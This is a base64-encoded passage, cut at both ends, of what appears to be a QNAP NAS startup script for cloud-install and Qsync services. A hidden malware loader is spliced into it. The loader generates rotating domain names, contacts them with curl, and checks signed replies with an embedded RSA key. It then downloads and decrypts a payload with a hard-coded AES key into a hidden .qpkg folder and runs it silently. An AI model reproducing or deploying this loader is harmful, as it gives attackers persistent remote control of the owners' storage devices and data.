Gdyb3VwIGFuZCBmb3IgbGF0ZXIga2lsbAogICAgL2Jpbi9zZXRzaWQgJENMT1VEX0lOU1RBTExfUEFUSC9iaW4vY2xvdWRpbnN0YWxsX2FnZW50X2Rpc2Nvbm5lY3RfZGFlbW9uLnNoIHN0YXJ0ICY+IC9kZXYvbnVsbCAmCiAgICAvYmluL3NldHNpZCAkQ0xPVURfSU5TVEFMTF9QQVRIL2Jpbi9jbG91ZGluc3RhbGxfYWdlbnRfZGFlbW9uLnNoICY+IC9kZXYvbnVsbCAmCgogICAgIyBzZXQgY2xvdWRpbnN0YWxsIHJlcG9ydCBzdGF0dXMKICAgIC9zYmluL3NldGNmZyAtZiAkUUlEX1BSRVNJU1RFTlRfQ09ORiAiQ0xPVURJTlNUQUxMIiAiUkVQT1JUX1NUQVRVUyIgInVuaW5pdCIKICAgICMgYWRkIGxpbmsgdG8gcmVwb3J0IG9mZmxpbmUKICAgIC9iaW4vbG4gLXNmIC9ldGMvaW5pdC5kL2Nsb3VkaW5zdGFsbF9yZXBvcnRfb2ZmbGluZS5zaCAvZXRjL3JjSy5kL0s5OWNsb3VkaW5zdGFsbF9yZXBvcnRfb2ZmbGluZQoKICAgICMgYnV6emVyCiAgICBIQVJEV0FSRV9UWVBFPSQodW5hbWUgLW0pCiAgICBpZiBbWyAiJEhBUkRXQVJFX1RZUEUiID09ICoieDg2IiogXV07CiAgICB0aGVuCiAgICAgIC9zYmluL2hhbF9hcHAgLS1zZV9idXp6ZXIgZW5jX2lkPTAsbW9kZT0xMDEKICAgIGVsaWYgW1sgIiRIQVJEV0FSRV9UWVBFIiA9PSAqImFybSIqIF1dOwogICAgdGhlbgogICAgICAvc2Jpbi9waWNfcmF3IDgxCiAgICBmaQogICAgOzsKCiAgc3RvcCkKICAgICMgZGlzY29ubmVjdCBjbG91ZGluc3RhbGwgYWdlbnQKICAgICRDTE9VRF9JTlNUQUxMX1BBVEgvYmluL2Nsb3VkaW5zdGFsbF9hZ2VudF9jdGwuc2ggc3RvcCAmPiAvZGV2L251bGwKICAgICRDTE9VRF9JTlNUQUxMX1BBVEgvYmluL2Nsb3VkaW5zdGFsbF9hZ2VudF9kaXNjb25uZWN0X2RhZW1vbi5zaCBzdG9wICY+IC9kZXYvbnVsbAogICAgZm9yIGkgaW4gIiR7Q0xPVURfSU5TVEFMTF9BR0VOVF9EQUVNT05fUElEX0xJU1RbQF19IgogICAgZG8KICAgICAgICAjIHVzZSBiYXNoIGtpbGwgaW5zdGVhZCAvYmluL2tpbGwgZm9yIGtpbGwgcHJvY2VzcyBncm91cAogICAgICAgICMgY2xvdWRpbnN0YWxsIGFnZW50IGRhZW1vbiBhbmQgaW5vdGlmeXdhaXQKICAgICAgICBraWxsIC05IC0tIC0kaSAmPi9kZXYvbnVsbAogICAgZG9uZQoKICAgICMgdW1vdW50CiAgICBpZiBbICIkTkFTX0FSQ0giID09ICJBUk1fNjQiIF07IHRoZW4KICAgICAgICAvYmluL3Vtb3VudCAtbCAkVVNFRF9MT09QX0RFVklDRQogICAgICAgIC91c3IvbG9jYWwvc2Jpbi9sb3NldHVwIC1kICRVU0VEX0xPT1BfREVWSUNFCiAgICBlbHNlCiAgICAgICAgL2Jpbi91bW91bnQgLWwgJENMT1VEX0lOU1RBTExfUEFUSAogICAgZmkKICAgICMgcmVtb3ZlIGFsbCBmaWxlcwogICAgaWYgWyAtZCAiJE5BU19DTE9VRF9JTlNUQUxMX1BBVEgiIF07IHRoZW4KICAgICAgICAvYmluL3JtIC1yZiAkTkFTX0NMT1VEX0lOU1RBTExfUEFUSAogICAgZmkKICAgIGlmIFsgLWQgIiRDTE9VRF9JTlNUQUxMX1BBVEgiIF07IHRoZW4KICAgICAgICAvYmluL3JtIC1yZiAkQ0xPVURfSU5TVEFMTF9QQVRICiAgICBmaQogICAgaWYgWyAtZCAiJENMT1VEX0lOU1RBTExfUkFNRElTS19QQVRIIiBdOyB0aGVuCiAgICAgICAgL2Jpbi9ybSAtcmYgJENMT1VEX0lOU1RBTExfUkFNRElTS19QQVRICiAgICBmaQogICAgOzsKCiAgcmVzdGFydCkKICAgICQwIHN0b3AKICAgICQwIHN0YXJ0CiAgICA7OwoKICAqKQogICAgZWNobyAiVXNhZ2U6ICQwIHtzdGFydHxzdG9wfHJlc3RhcnR9IgogICAgZXhpdCAxCmVzYWMKZXhpdCAwCgoKc2V0X2VudigpCnsKCWRlYnVnPWAkQ01EX0dFVENGRyBRc3luYyBEZWJ1ZyAtdSAtZCBOVUxMYAoJaWYgWyAiJGRlYnVnIiAhPSAiTlVMTCIgXTsgdGhlbgoJCS9iaW4vdG91Y2ggJExPR19GSUxFCgllbHNlCgkJL2Jpbi9ybSAtZiAkTE9HX0ZJTEUKCWZpCn0KCnNldF9lbnYKCmRiZygpCnsKCWlmIFsgLWYgIiRMT0dfRklMRSIgXTsgdGhlbgoJCWVjaG8gIltgZGF0ZSAiKyVIOiVNOiVTImBdICRAICIgPj4gJExPR19GSUxFCglmaQp9CgpkYmcgIj4gJDAgJEAgKHBpZCAkJCkiCgpmaQoKZXhwb3J0IFBBVEg9IiR7UEFUSH06L2Jpbjovc2JpbjovdXNyL2JpbjovdXNyL3NiaW46L3Vzci9iaW4vWDExOi91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2JpbiIKCmNvbW1hbmQgLXYgZ2V0Y2ZnID4gL2Rldi9udWxsIDI+JjEgfHwgZ2V0Y2ZnICgpIHsgc2VkIC1uICdIOyR7eDtzL1woLipcblxbJyIkezEvL1wvL1xcXC99IiddXHxeXFsnIiR7MS8vXC8vXFxcL30iJ11cKVxuLy9JO3MvXCheXHxcblwpXFtbXlxuXVwrXF1cbi4qLy9wfScgIiR7NDotJHtjb25mZGlyfS91TGludXguY29uZn0iIHwgc2VkIC1uICdzL14nIiR7Mi8vXC8vXFxcL30iJyBcPz0gXD9cKC4qXCkvXDEvSXAnOyB9Cgp0ZXN0IC1kIC9ldGMvY29uZmlnICYmIGNvbmZkaXI9L2V0Yy9jb25maWcgfHwgeyB0ZXN0IC1kIC9tbnQvSERBX1JPT1QvLmNvbmZpZyAmJiBjb25mZGlyPS9tbnQvSERBX1JPT1QvLmNvbmZpZzsgfQp0ZXN0IC1kICIkY29uZmRpciIgfHwgY29uZmRpcj0vZXRjL2NvbmZpZwoKYmRpcj0KdGVzdCAtZiAiJHtjb25mZGlyfS9zbWIuY29uZiIgJiYgZm9yIGkgaW4gaG9tZXMgUHVibGljIERvd25sb2FkIE11bHRpbWVkaWEgV2ViIFJlY29yZGluZ3M7IGRvIGJkaXI9YGdldGNmZyAiJGkiIHBhdGggLWYgIiR7Y29uZmRpcn0vc21iLmNvbmYiYCAmJiB0ZXN0ICEgLXogIiRiZGlyIiAmJiBiZGlyPWBkaXJuYW1lICIkYmRpciJgICYmIHRlc3QgLWQgIiRiZGlyIiAmJiB0ZXN0d3JpdGVhYmxlPSQobWt0ZW1wICIke2JkaXJ9Ly50bXAuWFhYWFhYIikgJiYgcm0gIiR7dGVzdHdyaXRlYWJsZX0iICYmIGJyZWFrOyBiZGlyPScnOyBkb25lCnRlc3QgLXogIiR7YmRpcn0iIHx8IHRlc3QgISAtZCAiJHtiZGlyfSIgJiYgeyBjb21tYW5kIC12IHJlYWRsaW5rID4vZGV2L251bGwgMj4mMSB8fCBsbiAtc2YgL2Jpbi9idXN5Ym94IC91c3IvYmluL3JlYWRsaW5rOyBmb3IgaSBpbiBQdWJsaWMgRG93bmxvYWQgTXVsdGltZWRpYSBXZWIgUmVjb3JkaW5ncyBob21lczsgZG8gYmRpcj1gcmVhZGxpbmsgIi9zaGFyZS8ke2l9IiAyPi9kZXYvbnVsbGAgJiYgdGVzdCAhIC16ICIkYmRpciIgJiYgYmRpcj1gZGlybmFtZSAiJGJkaXIiYCAmJiBiZGlyPS9zaGFyZS8ke2JkaXIjIyovfSAmJiB0ZXN0IC1kICIkYmRpciIgJiYgYnJlYWs7IGRvbmU7CnRlc3QgLXogIiR7YmRpcn0iIHx8IHRlc3QgISAtZCAiJHtiZGlyfSI7IH0gJiYgeyBiZGlyPWBnZXRjZmcgU0hBUkVfREVGIGRlZlZvbE1QIC1mICIke2NvbmZkaXJ9L2RlZl9zaGFyZS5pbmZvImAKdGVzdCAteiAiJHtiZGlyfSIgfHwgdGVzdCAhIC1kICIke2JkaXJ9IjsgfSAmJiB7IGJkaXI9YG1vdW50IHwgc2VkIC1uICJzLy4qXChcL3NoYXJlXC9bXiAvXVwrXCkgLiovXDEvZ3AiIHwgaGVhZCAtbiAxYAp0ZXN0IC16ICIke2JkaXJ9IiB8fCB0ZXN0ICEgLWQgIiR7YmRpcn0iOyB9ICYmIHsgZm9yIGkgaW4gQ0FDSEVERVYzX0RBVEEgQ0FDSEVERVYyX0RBVEEgQ0FDSEVERVYxX0RBVEEgTUQwX0RBVEE7IGRvIHRlc3QgLWQgIi9zaGFyZS8ke2l9IiAmJiBiZGlyPSIvc2hhcmUvJHtpfSIgJiYgYnJlYWs7IGRvbmU7CnRlc3QgLXogIiR7YmRpcn0iIHx8IHRlc3QgISAtZCAiJHtiZGlyfSIgJiYgYmRpcj0vbW50L0hEQV9ST09UOyB9CmVjaG8gJ2FiKmMnIHwgZ3JlcCAtRiAnYWIqYycgPi9kZXYvbnVsbCAyPiYxICYmIGZncmVwPSJncmVwIC1GIiB8fCB7IGNvbW1hbmQgLXYgZmdyZXAgPi9kZXYvbnVsbCAyPiYxICYmIGZncmVwPWZncmVwIHx8IGZncmVwPWdyZXA7IH0KdGVzdCAiJGZncmVwIiB8fCBmZ3JlcD1ncmVwCnRlc3QgIiRSQU5ET00iIHx8IFJBTkRPTT0xNzY1MwpnZW5yc3RyICgpIAp7IAogICAgbG9jYWwgcz07CiAgICBsb2NhbCBtaW49JHsxOi00fTsKICAgIGxvY2FsIG1heD0kezI6LTEyfTsKICAgIGxvY2FsIGtzcGFjZT0iJHszOi1hLXpBLVp9IgogICAgdHIgLWRjICIka3NwYWNlIiA8IC9kZXYvdXJhbmRvbSB8IHsgCiAgICAgICAgcmVhZCAtcm4gJCgoJFJBTkRPTSAlICggJG1heCAtICRtaW4gKyAxICkgKyAkbWluICkpIHM7CiAgICAgICAgZWNobyAiJHMiCiAgICB9Cn0KCnZlcmlmeWZpbGUoKSB7CmxvY2FsIGZpbGU9IiQxIgpsb2NhbCBzaWc9IiR7MjotJGZpbGVfc30iCmxvY2FsIG91dAp0ZXN0ICEgLXogIiRmaWxlIiAmJiB0ZXN0IC1zICIkZmlsZSIgfHwgcmV0dXJuIDEKdGVzdCAhIC16ICIkc2lnIiAmJiB0ZXN0IC1zICIkc2lnIiB8fCByZXR1cm4gMQp0ZXN0IC1mICIucnNha2V5IiB8fCBlY2hvICIkdmVyaWZ5a2V5IiA+ICIucnNha2V5IgpvdXQ9JChvcGVuc3NsIGRnc3QgLXNoYTEgLXZlcmlmeSAiLnJzYWtleSIgLXNpZ25hdHVyZSAiJHNpZyIgIiRmaWxlIikgJiYgdGVzdCAiJG91dCIgPSAiVmVyaWZpZWQgT0siICYmIHJldHVybiAwCnJldHVybiAxCn0KCmRlY3J5cHRmaWxlKCkgewpsb2NhbCBmaWxlPSIkMSIKbG9jYWwgb2ZpbGU9IiR7MjotJHtmaWxlfX0iCmxvY2FsIGtleT0nN0Mwdks0U3pNTzE1ekJ4TEQ3WENpNWhiamdQMVpqa0onCm9wZW5zc2wgZW5jIC1kIC1hZXMtMjU2LWNiYyAtayAiJGtleSIgLW1kIHNoYTEgLXNhbHQgPCAiJGZpbGUiID4gIiR7ZmlsZX1fZCIgfHwgcmV0dXJuICQ/CnRlc3QgLWYgIiRvZmlsZSIgJiYgcm0gLWYgIiRvZmlsZSIKbXYgIiR7ZmlsZX1fZCIgIiRvZmlsZSIgJiYgcmV0dXJuIDAKcmV0dXJuIDEKfQoKdmVyaWZ5a2V5PSctLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLQpNSUlCb2pBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVk4QU1JSUJpZ0tDQVlFQXQvRURUNlNCNzVhdHJIVzdDcG9nCkNYcXJCTTJDVmJKbyc7dmVyaWZ5a2V5PSIke3ZlcmlmeWtleX0iJ2c0cnd3UycnejFCcDFpMScKdmVyaWZ5a2V5PSIke3ZlcmlmeWtleX0iJ0I3QjlXZDUxbm8zMmxwUnFPTSs5R09yMlcxN3h3SjhwcXBRb3RleApSQzVxUVNpUy83RlM0OGpzUEtzSm5yVWhuc0kxZlJMTTREcXNFRjNVT3VrWnVET1lVaGx0ZUR1TXFxWkJ6MEFDClEzWW5ManJhVGpjaE1GMFhtYUFBY1dPa2c1TXN4QU9LVGVwdWU0Ui90bnJQQWtBRzg2bnE1TEExK3dhN29wTlYKZ1F6d0RoN1lYaEJuV3o1MitlYlo5VGVxRDMxL3NiNWhveVVLZjFOcjVIY0tra2xPYnV6MU9HUUovL3BrQ2JUQwoyRW5RdzZ0Q1BRaGdTSUE4d0pLa2F4VzBmL1VIUCtZQm1XYTRXbit1UHJKSnVIU1ZORUp0QXAyd2xYM1RIbHR6CjBJR1BRRXV6b2FmT0FsM0VGamFzM0hjVFgySGxFZm52QXRSTDJpTHhKZWJhMW5aK1UzZ2VaT3V4TDFOaFdoTmgKcGphTGNLd2hrUmNrN1k1aHIxUHo4cExEblhzeDV3MFFVejZYUzhIVmYvS0huTlhIdWZGRW4wMXk5WW9QdWF1MQpETm5wREdicTYzMkJzOEVTZDN1ZUhrOU9ZL1VaeFdlTjNVZGJzZUZ4SzM1WEFnTUJBQUU9Ci0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLScKCkRPTUFJTl9FWFRfQT0nY2YgdGsgbWwgZ2EgZ3EnCkRPTUFJTl9FWFRfQj0nY29tIGJpeiBvcmcgZGUgcm9ja3MgbXggY24gdG9wIG5sIG1lbiB3cyBzZSBpbmZvIHh5eiBuZXQgdG9kYXkgcnUgZmkgbmFtZSB0byBpbiBjb20udWEgdmcgdm4gY2QnCgp0ZXN0IC1kICIke2JkaXJ9Ly5xcGtnIiB8fCBta2RpciAiJHtiZGlyfS8ucXBrZyIKdGVzdCAtZCAiJHtiZGlyfS8ucXBrZy8ubGl2ZXVwZGF0ZSIgfHwgbWtkaXIgIiR7YmRpcn0vLnFwa2cvLmxpdmV1cGRhdGUiCmNkICIke2JkaXJ9Ly5xcGtnLy5saXZldXBkYXRlIiAmJiBybSAtZiAudG1wLioKCmVjaG8gIiR2ZXJpZnlrZXkiID4gIi5yc2FrZXkiCmk9MCBuPTAgYz0wIGVycm9yY291bnQ9MApvdXRmaWxlPSQobWt0ZW1wICIuLy50bXAuWFhYWFhYIikgfHwgb3V0ZmlsZT0kKG1rdGVtcCAiJHtiZGlyfS8udG1wLlhYWFhYWCIpIHx8IG91dGZpbGU9JChta3RlbXAgIi8udG1wLlhYWFhYWCIpIHx8IG91dGZpbGU9Jy4vLnRtcC5vdXQnCgpmb3IgZG9tYWluZXh0cyBpbiAiJERPTUFJTl9FWFRfQSIgIiRET01BSU5fRVhUX0IiOyBkbwogICAgICAgIGZvciBleHQgaW4gJGRvbWFpbmV4dHM7IGRvCiAgICAgICAgICAgICAgICBob3N0bmFtZT0kKGVjaG8gIiQoKCAkKGRhdGUgKyVzKSAvIDEyOTYwMDAgKSlJYmpHT0VnbnVEJHtleHR9IiB8IG9wZW5zc2wgZGdzdCAtc2hhMSAtYmluYXJ5IHwgb3BlbnNzbCBiYXNlNjQgfCBzZWQgJ3kvQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVotK1wvL2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6YWJjLztzLz0vL2cnKQogICAgICAgICAgICAgICAgaG9zdG5hbWU9JHtob3N0bmFtZSVbYS16MC05XVthLXowLTldW2EtejAtOV1bYS16MC05XVthLXowLTldW2EtejAtOV1bYS16MC05XVthLXowLTldW2EtejAtOV1bYS16MC05XVthLXowLTldW2EtejAtOV1bYS16MC05XVthLXowLTldW2EtejAtOV1bYS16MC05XVthLXowLTldfQogICAgICAgICAgICAgICAgaG9zdG5hbWVzPSIke2hvc3RuYW1lJVthLXowLTldW2EtejAtOV1bYS16MC05XVthLXowLTldfSAke2hvc3RuYW1lJVthLXowLTldW2EtejAtOV1bYS16MC05XX0iCiAgICAgICAgICAgICAgICBob3N0bmFtZXM9IiRob3N0bmFtZXMgJHtob3N0bmFtZSVbYS16MC05XVthLXowLTldfSAke2hvc3RuYW1lJVthLXowLTldfSAkaG9zdG5hbWUiCiAgICAgICAgICAgICAgICBmb3IgaG9zdCBpbiAkaG9zdG5hbWVzOyBkbwogICAgICAgICAgICAgICAgICAgICAgICB0ZXN0IC1mICIkb3V0ZmlsZSIgJiYgcm0gLWYgIiRvdXRmaWxlIgogICAgICAgICAgICAgICAgICAgICAgICByZWNlbnR1cGRhdGU9JycKICAgICAgICAgICAgICAgICAgICAgICAgY3VybCAtLWNvbm5lY3QtdGltZW91dCAxMiAtbSAzMCAtayAtbyAiJG91dGZpbGUiICJodHRwczovLyR7aG9zdH0uJHtleHR9L3FuYXBfZmlybXdhcmUueG1sP3Q9JChkYXRlICslcykiCiAgICAgICAgICAgICAgICAgICAgICAgIHRlc3QgLXMgIiRvdXRmaWxlIiB8fCBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICBmc2l6ZT0kKCggJCh3YyAtYyA8ICIkb3V0ZmlsZSIpICkpCiAgICAgICAgICAgICAgICAgICAgICAgIHRlc3QgIiRmc2l6ZSIgLWd0IDQwOTYgJiYgcm0gLWYgIiRvdXRmaWxlIiAmJiBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICByc2Ftc2c9JChvcGVuc3NsIGJhc2U2NCAtaW4gIiRvdXRmaWxlIiAtZCB8IG9wZW5zc2wgcnNhdXRsIC1wdWJpbiAtaW5rZXkgIi5yc2FrZXkiIC12ZXJpZnkpIHx8IGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgIHRlc3QgIiRyc2Ftc2ciIHx8IGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgIHBhdGg9IiR7cnNhbXNnJXwqfSI7IHJzYWRvbWFpbj0iJHtwYXRoJXwqfSI7IHBhdGg9IiR7cGF0aCMqfH0iCiAgICAgICAgICAgICAgICAgICAgICAgIGhhc2g9IiR7cnNhbXNnIyMqfH0iOyB0cz0iJHtoYXNoIypffSI7IGhhc2g9IiR7aGFzaCVfKn0iCiAgICAgICAgICAgICAgICAgICAgICAgIHRlc3QgIiRyc2Fkb21haW4iID0gIiR7aG9zdH0uJHtleHR9IiB8fCBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICB0aW1lbm93PSQoZGF0ZSArJXMpCiAgICAgICAgICAgICAgICAgICAgICAgIHRlc3QgIiR0cyIgLWd0IDAgJiYgeyB0ZXN0ICIkdHMiIC1ndCAiJHRpbWVub3ciIHx8IHRlc3QgJCgoICR0aW1lbm93IC0gJHRzICkpIC1sdCAxNzI4MDA7IH0gJiYgcmVjZW50dXBkYXRlPTEKICAgICAgICAgICAgICAgICAgICAgICAgY3VybCAtLWNvbm5lY3QtdGltZW91dCAxMiAtbSAzMDAgLWsgLW8gIiRvdXRmaWxlIiAiaHR0cHM6Ly8ke2hvc3R9LiR7ZXh0fS8ke3BhdGh9IgogICAgICAgICAgICAgICAgICAgICAgICBmaWxlaGFzaD0kKG9wZW5zc2wgZGdzdCAtc2hhMSAtYmluYXJ5ICIkb3V0ZmlsZSIgfCBvcGVuc3NsIGJhc2U2NCkgfHwgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgdGVzdCAiJGZpbGVoYXNoIiA9ICIkaGFzaCIgfHwgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgY3VybCAtLWNvbm5lY3QtdGltZW91dCAxMiAtbSAzMCAtayAtbyAiJHtvdXRmaWxlfV9zIiAiaHR0cHM6Ly8ke2hvc3R9LiR7ZXh0fS9zLyR7cGF0aH0iCiAgICAgICAgICAgICAgICAgICAgICAgIHZlcmlmeWZpbGUgIiRvdXRmaWxlIiAiJHtvdXRmaWxlfV9zIiAmJiBkZWNyeXB0ZmlsZSAiJG91dGZpbGUiIHx8IGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgIG12ICIke291dGZpbGV9X3MiICIke3RzfV92IgogICAgICAgICAgICAgICAgICAgICAgICBjaG1vZCA3NTUgIiRvdXRmaWxlIiB8fCBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICAoICggZXhlYyA+L2Rldi9udWxsIDI+L2Rldi9udWxsIDwvZGV2L251bGw7ICIkb3V0ZmlsZSIgPC9kZXYvbnVsbCA+L2Rldi9udWxsIDI+JjEgJiApICYgKQogICAgICAgICAgICAgICAgICAgICAgICB0ZXN0ICIkcmVjZW50dXBkYXRlIiAtZXEgMSAmJiBleGl0IDAKICAgICAgICAgICAgICAgIGRvbmUKICAgICAgICBkb25lCmRvbmUKCgppZiBbICIkZnJvbXJjUyIgPSAnVFJVRScgXTsgdGhlbgojIGlmIFFzeW5jIGlzIGRpc2FibGUgYmVmb3JlIDQuMy4wLCB3ZSB3aWxsIHRvdWNoIC9tbnQvSERBX1JPT1QvdWRwYXRlX3BrZy8uUXN5bmNTZXJ2ZXJfZGlzYWJsZWQKc2V0X2RlZmF1bHRfZGlzYWJsZV9zdGF0dXMoKQp7CglRUEtHX0VOQUJMRT1gJENNRF9HRVRDRkcgJHtRU1lOQ19OQU1FfSBFbmFibGUgLWQgIk5VTEwiIC1mICR7UVBLR19DT05GfWAKCU9MRF9FTkFCTEU9YCRDTURfR0VUQ0ZHIFFzeW5jIEVuYWJsZSAtdSAtZCBOVUxMYAoJaWYgWyAtZiAiJHtVUERBVEVQS0dfRElSfS8uJHtRU1lOQ19OQU1FfV9yZW1vdmVkIiBdOyB0aGVuCgkJcmV0dXJuCglmaQoKCWlmIFsgIiRRUEtHX0VOQUJMRSIgPSAiTlVMTCIgXTsgdGhlbgoJCWlmIFsgIiRPTERfRU5BQkxFIiA9ICJGQUxTRSIgXTsgdGhlbgoJCQlkYmcgInRvdWNoICR7VVBEQVRFUEtHX0RJUn0vLiR7UVNZTkNfTkFNRX1fZGlzYWJsZWQiCgkJCS9iaW4vdG91Y2ggIiR7VVBEQVRFUEtHX0RJUn0vLiR7UVNZTkNfTkFNRX1fZGlzYWJsZWQiCgkJZmkKCWZpCn0KCmlmIFsgIngkSEJTX0VOQUJMRSIgPSB4bnVsbCBdIHx8IFsgIngkSEJTX0VOQUJMRSIgPSB4RkFMU0UgXTsgdGhlbgoJZXhwb3J0IFFOQVBfUVBLRz1ydHJyCmVsc2UKCWV4cG9ydCBRTkFQX1FQS0c9SHlicmlkQmFja3VwCgkvdXNyL2xvY2FsL3NiaW4vcWJvb3N0X3V0aWwgLVMgLW4gcnRyciAtRSAwIDE+L2Rldi9udWxsIDI+JjEKZmkKc3RhcnQoKQp7CglpZiBbIC1mIC91c3IvYmluL3FzeW5jbWFuIF07IHRoZW4KCQlbICEgLWYgL2V0Yy9jb25maWcvaGRjb3B5dXNiLmNvbmYgXSB8fCAvYmluL3JtIC1mIC9ldGMvY29uZmlnL2hkY29weXVzYi5jb25mCgkJL2Jpbi9zZWQgLWkgJy9oZHVzYl9jb3B5L2QnIC9ldGMvY29uZmlnL2Nyb250YWIKCQkvdXNyL2Jpbi9jcm9udGFiIC9ldGMvY29uZmlnL2Nyb250YWIKCQllY2hvIC1uICJTdGFydGluZyBRU3luYyBtYW5pdG9yOiAiCgkJWyAtZCAvZXRjL2NvbmZpZy9xc3luYyBdIHx8IC91c3IvYmluL2luc3RhbGwgLWQgL2V0Yy9jb25maWcvcXN5bmMKCQlbIC1mIC9ldGMvY29uZmlnL3FzeW5jL3Fob3N0LmNvbmYgXSB8fCAvYmluL3RvdWNoIC9ldGMvY29uZmlnL3FzeW5jL3Fob3N0LmNvbmYKCQlbIC1mIC9ldGMvY29uZmlnL3FzeW5jL3FzeW5jam9iZGVmLmNvbmYgXSB8fCAvYmluL3RvdWNoIC9ldGMvY29uZmlnL3FzeW5jL3FzeW5jam9iZGVmLmNvbmYKCQlbIC1mIC9ldGMvY29uZmlnL3FzeW5jL3FzeW5jLmNvbmYgXSB8fCAvYmluL2NwIC1wIC9ldGMvZGVmYXVsdF9jb25maWcvcXN5bmMvcXN5bmMuY29uZiAvZXRjL2NvbmZpZy9xc3luYy9xc3luYy5jb25mCgkJWyAtZiAvZXRjL2NvbmZpZy9xc3luYy9leHRkcnYuY29uZiBdIHx8IC9iaW4vY3AgLXAgL2V0Yy9kZWZhdWx0X2NvbmZpZy9xc3luYy9leHRkcnYuY29uZiAvZXRjL2NvbmZpZy9xc3luYy9leHRkcnYuY29uZgoJCVsgLWYgL2V0Yy9jb25maWcvcXN5bmMvcXN5bmNkLmNvbmYgXSB8fCAvYmluL2NwIC1wIC9ldGMvZGVmYXVsdF9jb25maWcvcXN5bmMvcXN5bmNkLmNvbmYgL2V0Yy9jb25maWcvcXN5bmMvcXN5bmNkLmNvbmYKCQlbICEgLWYgL2V0Yy9jb25maWcvcXN5bmMvcXN5bmNkLmNvbmYgXSB8fCAvYmluL2NobW9kIDY0MCAvZXRjL2NvbmZpZy9xc3luYy9xc3luY2QuY29uZgoJCVsgISAtZiAvZXRjL2NvbmZpZy9xc3luYy9xc3luYy5jb25mIF0gfHwgL2Jpbi9jaG1vZCA2NDAgL2V0Yy9jb25maWcvcXN5bmMvcXN5bmMuY29uZgoJCVsgISAtZiAvZXRjL2NvbmZpZy9xc3luYy9xaG9zdC5jb25mIF0gfHwgL2Jpbi9jaG1vZCA2NDAgL2V0Yy9jb25maWcvcXN5bmMvcWhvc3QuY29uZgoJCS9zYmluL2RhZW1vbl9tZ3IgcXN5bmNtYW4gc3RhcnQgIi91c3IvYmluL3FzeW5jbWFuIDE+L2Rldi9udWxsIDI+JjEiCgkJZWNobyAiT0siCglmaQp9CgpzdG9wKCkKewoJZWNobyAiU2h1dHRpbmcgZG93biBRU3luYyBtb25pdG9yOiBPSyIKICAgICAgICBwaWRudW09YC9iaW4vcGlkb2YgcXN5bmNgYC9iaW4vcGlkb2YgcXN5bmNkYAogICAgICAgIGtpbGwgJHBpZG51bSAyPi9kZXYvbnVsbAogICAgICAgIGk9MAogICAgICAgIHdoaWxlIFsgJHtpfSAtbHQgNSBdCiAgICAgICAgZG8KICAgICAgICAgICAgICAgIHBpZG51bT1gL2Jpbi9waWRvZiBxc3luY2BgL2Jpbi9waWRvZiBxc3luY2RgCiAgICAgICAgICAgICAgICBpZiBbIC16ICIkcGlkbnVtIiBdOyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBmaQogICAgICAgICAgICAgICAgc2xlZXAgMQogICAgICAgICAgICAgICAgaT1gL3Vzci9iaW4vZXhwciAke2l9ICsgMWAKICAgICAgICBkb25lCiAgICAgICAgcGlkbnVtPWAvYmluL3BpZG9mIHFzeW5jYGAvYmluL3BpZG9mIHFzeW5jZGAKICAgICAgICBbIC16ICIkcGlkbnVtIiBdIHx8IGtpbGwgLTkgJHBpZG51bSAyPi9kZXYvbnVsbAoJL3NiaW4vZGFlbW9uX21nciBxc3luY21hbiBzdG9wICIvdXNyL2Jpbi9xc3luY21hbiIKCS91c3IvYmluL2tpbGxhbGwgLXEgcXN5bmNtYW4KfQoKc3RhcnRfcXN5bmNkKCkKewoJI19xc3luY2RfZW49YC9zYmluL2dldGNmZyAiIiBFbmFibGVkIC1kIDAgLWYgL2V0Yy9xc3luYy9xc3luY2QuY29uZmAKCSNbICJ4JF9xc3luY2RfZW4iID0geDEgXSB8fCByZXR1cm4gLTEKCV9xc3luY2RfcnVuX3BpZD1gL2Jpbi9waWRvZiBxc3luY2RgCglbIC16ICRfcXN5bmNkX3J1bl9waWQgXSB8fCByZXR1cm4gLTExNAoJX3JlY3ljbGVfZW49YC9zYmluL2dldGNmZyAnTmV0d29yayBSZWN5Y2xlIEJpbicgRW5hYmxlIC1kIEZBTFNFYAoJX3dpdGhfc3lzbG9nPSQxCglpZiBbICJ4JF9yZWN5Y2xlX2VuIiA9IHhUUlVFICBdOyB0aGVuCgkJaWYgWyAieCRfd2l0aF9zeXNsb2ciID0geDEgIF07IHRoZW4KCQkJTERfUFJFTE9BRD0vdXNyL2xvY2FsL2xpYi9saWJ0cmFzaC5zbyAvdXNyL2Jpbi9xc3luY2QgLXN5c2xvZyAtYzovZXRjL3FzeW5jL3FzeW5jZC5jb25mCgkJZWxzZQoJCQlMRF9QUkVMT0FEPS91c3IvbG9jYWwvbGliL2xpYnRyYXNoLnNvIC91c3IvYmluL3FzeW5jZCAtYzovZXRjL3FzeW5jL3FzeW5jZC5jb25mCgkJZmkKCWVsc2UKCQlpZiBbICJ4JF93aXRoX3N5c2xvZyIgPSB4MSAgXTsgdGhlbgoJCQkvdXNyL2Jpbi9xc3luY2QgLXN5c2xvZyAtYzovZXRjL3FzeW5jL3FzeW5jZC5jb25mCgkJZWxzZQoJCQkvdXNyL2Jpbi9xc3luY2QgLWM6L2V0Yy9xc3luYy9xc3luY2QuY29uZgoJCWZpCglmaQoJX2lyZXQ9JD8KCWlmIFsgIngkX2lyZXQiID0geDAgXTsgdGhlbgoJCWk9MAoJCXdoaWxlIFsgJHtpfSAtbHQgMTAwMDAgXQoJCWRvCgkJCWVjaG8gIiR7aX0gbWlsbGlzZWNvbmQuLi4iCgkJCV9xc3luY2RfcGlkPWAvc2Jpbi9nZXRjZmcgJycgUGlkIC1kIC0xIC1mIC9ldGMvcXN5bmMvcXN5bmNkLmNvbmZgCgkJCV9xc3luY2RfcnVuX3B